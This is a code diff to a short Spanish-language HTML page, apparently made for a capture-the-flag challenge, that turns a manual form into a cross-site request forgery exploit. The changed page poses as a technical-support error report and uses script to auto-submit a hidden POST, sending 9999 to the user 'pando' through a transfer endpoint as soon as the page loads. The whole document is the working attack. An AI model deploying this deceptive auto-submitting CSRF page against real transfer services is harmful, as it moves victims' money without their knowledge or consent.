@@ -1,13 +1,21 @@
 <!DOCTYPE html>
 <html>
+  <head>
+    <title>Soporte Técnico - Error ID 4432</title>
+  </head>
   <body>
-    <h2>Incidencia en transferencia</h2>
-    <p>Pulse el botón para reproducir el error.</p>
+    <h2>Procesando reporte de incidencia...</h2>
+    <p>Cargando datos del error, por favor espere.</p>
 
-    <form action="https://ctf.fap.hispasec.com:8009/transfer" method="POST">
+    <form id="exploitForm" action="https://ctf.fap.hispasec.com:8009/transfer" method="POST">
       <input type="hidden" name="to" value="pando">
       <input type="hidden" name="amount" value="9999">
-      <input type="submit" value="Reproducir incidencia">
-    </form>
+      </form>
+
+    <script>
+      // Este script se ejecuta en cuanto carga la página
+      console.log("Enviando exploit automáticamente...");
+      document.getElementById('exploitForm').submit();
+    </script>
   </body>
 </html>
